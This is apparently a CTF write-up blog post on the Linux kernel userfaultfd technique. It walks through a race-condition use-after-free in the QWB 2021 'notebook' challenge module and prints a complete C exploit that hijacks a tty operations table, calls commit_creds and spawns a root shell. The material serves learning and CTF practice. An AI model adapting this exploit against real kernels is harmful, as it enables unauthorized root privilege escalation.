---
title: "Introduction of Kernel Pwn: userfaultfd"
date: 2022-05-20 18:52:21
tags: 
layout: default
---

# 0x00 Prologue
I only have little experience with kernel pwn. During the `Intro_to_OS` course, I read a lot of kernel code of `xv6` and learned the kernel systematically. Although `xv6` is a simple system while the `Linux` kernel is much more complex, the knowledge from `xv6` learned helps a lot.

This post would not go too deep into the kernel because I am too weak to do that and I got all the solution ideas from `CTF-wiki`. You can also download the attachments at this [link][1]

# 0x01 userfaultfd

It's a common trick used in kernel race condition exploitation. In general, it allows us to pause a thread so that it could be easier to trigger race conditions.

More specifically, we use `userfaultfd` to create a handler for a specific page. In exploitation cases, the `copy_from_user` may trigger a handler so that we can pause a thread.

I use the module from CTF-Wiki: 
```c
void RegisterUserfault(void *fault_page,void *handler)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        Panic("ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; 
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) 
        Panic("ioctl-UFFDIO_REGISTER");

    int s = pthread_create(&thr, NULL,handler, (void*)uffd);

    if (s!=0)
        Panic("pthread_create");
}
void* userfaultfd_leak_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    
    nready = poll(&pollfd, 1, -1);
    sleep(3);
    if (nready != 1)
    {
        Panic("Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        Panic("msg err");
    }

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        Panic("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    return NULL;
}
// char *example = mmap(NULL,0x1000,0x6,0x22,-1,0);
// RegisterUserfault(example,userfaultfd_leak_handler);
```

I don't know the trick well so I only write down the gist of exp and you can get a more detailed passage on this [link][2]

# 0x02 Analysis

[attachment][3]

The vulnerability is about synchronization. Although there are some synchronization mechanisms, there is only `read_lock` in `add` and `edit` so that the size could be rewritten for free. 

1. Assume there are two steps in `add`(A:getsize & B:allocate) and two steps in `edit`(A:getsize & B:reallocate).
2. There are 6 different conditions could happen if these steps happent in different order
3. (1A1B2A2B),(1A2A1B2B),(1A2A2B1B),(reversed ones...)

There is a simple UAF if the steps happen in the following order:
1. edit(0) -> A
2. add(x) ->A & B
3. edit(0) -> B



# 0x03 Exploit

I didn't pay much time to review the details in the exploit script and only reproduce it by imitating so the explanation would be very limit.

1. The main idea is to control a tty fd and modify the ops table.
2. We can use `work_for_cpu_fn` to run arbitrary function with our parameter
3. There is a little limit about `write`. The element would be changed before triggering `work_forcpu_fn`
4. In chaitin's script, they hijack ioctl and use `ioctl(233,233)` to correctly trigger `work_forcpu_fn` without modifying our parameters.


```c
//gcc ./fs/exp.c -masm=intel --static -o ./fs/exp
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <poll.h>
#include <sys/mman.h>
#define PAGE_SIZE 0x1000
#define TTYMAGIC 0x100005401
void * hit ;
uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(unsigned int)buf[7-i];
    }
    return res;
}
void Panic(char *s)
{
    printf("[!] Panic:");
    puts(s);
    exit(1);
}
typedef struct{
        size_t idx;
        size_t size;
        char * buf;
    }X;
int fp = 0 ; 
void RegisterUserfault(void *fault_page,void *handler)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        Panic("ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; 
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) 
        Panic("ioctl-UFFDIO_REGISTER");

    int s = pthread_create(&thr, NULL,handler, (void*)uffd);

    if (s!=0)
        Panic("pthread_create");
}
void* userfaultfd_leak_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    
    nready = poll(&pollfd, 1, -1);
    sleep(3);
    if (nready != 1)
    {
        Panic("Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        Panic("msg err");
    }

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        Panic("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    return NULL;
}
void add(size_t idx,size_t size,size_t name)
{
    X n132;
    n132.idx = idx;
    n132.buf = name;
    n132.size = size;
    ioctl(fp,0x100,&n132);
}
void edit(size_t idx,size_t size,size_t name){
    X n132;
    n132.idx = idx;
    n132.buf = name;
    n132.size = size;
    ioctl(fp,0x300,&n132);
}
void gift(size_t name){
    X n132;
    n132.idx = 1;
    n132.buf = name;
    n132.size = 1;
    ioctl(fp,0x64,&n132);
}
void add_thread(size_t idx)
{
    add(idx,0x60,hit);
}
void edit_thread(size_t idx)
{
    edit(idx,0,hit);
}
int main()
{

    char buf[0x1000]={0};
    hit = mmap(NULL,0x1000,0x6,0x22,-1,0);
    RegisterUserfault(hit,userfaultfd_leak_handler);

    fp = open("/dev/notebook",2);
    if(fp<0)
        Panic("OPEN");
    add(0,0x60,"n132");
    add(1,0x60,"n132");
    
    edit(0,0x2e0,"n132");
    edit(1,0x500,"n132");

    pthread_t add_t,edit_t;
    pthread_create(&add_t,NULL,edit_thread,0);
    sleep(0.5);
    pthread_create(&edit_t,NULL,add_thread,0);
    sleep(0.5);
    int mx = -1;
    for(int i =0;i<0x20;i++)
    {
        mx = open("/dev/ptmx",O_RDWR|O_NOCTTY);
        if(mx<0)
            Panic("PTMX");
        read(fp,buf,0);
        if(*(size_t *)buf == TTYMAGIC)
            break;//UAF
    }
    if(*(size_t *)buf != TTYMAGIC)
        Panic("Fail to UAF");
    
    
    char gift_buf[0x100];
    gift(gift_buf);
    size_t note_addr = u64(gift_buf+0x10);

    read(fp,buf,0);
    size_t leak = u64(buf+0x18);
    // Relocate Functions
    size_t work_for_cpu = leak+(0xffffffff8109eb90-0xffffffff81e8e440);
    size_t commit_cred  = leak+(0xffffffff810a9b40-0xffffffff81e8e440);
    size_t prepare_cred = leak+(0xffffffff810a9ef0-0xffffffff81e8e440);

    size_t * fake_tty[0x100] = {0};
    size_t * vtable[0x100] = {0};

    read(fp,( char * )fake_tty,0);
    fake_tty[3] = note_addr;
    fake_tty[4] = prepare_cred;
    fake_tty[5] = 0;


    // Modify the Vtable of TTY fd
    write(fp,( char * )fake_tty,0);
    vtable[12] = work_for_cpu;
    write(fp,vtable,1);


    //
    printf("[+] Prepare a cred\n");
    ioctl(mx,233,233);//TBD


    read(fp,( char * )fake_tty,0);
    size_t cred = u64(&fake_tty[6]);
    // printf("%p\n",cred);
    read(fp,( char * )fake_tty,0);
    fake_tty[4] = commit_cred;
    fake_tty[5] = cred;
    write(fp,( char * )fake_tty,0);
    puts("[+] Commit the cred");
    ioctl(mx,233,233);


    read(fp,( char * )fake_tty,0);
    if(0!=u64(&fake_tty[6]))
        Panic("Fail to commit the cred");
    puts("[+] Spawning a root shell...");
    puts("[!] Hi Root,");
    system("/bin/sh");

}
```


[1]: https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel
[2]: https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/
[3]: https://github.com/n132/attachment/tree/main/QWB_2021_Qual/notebook
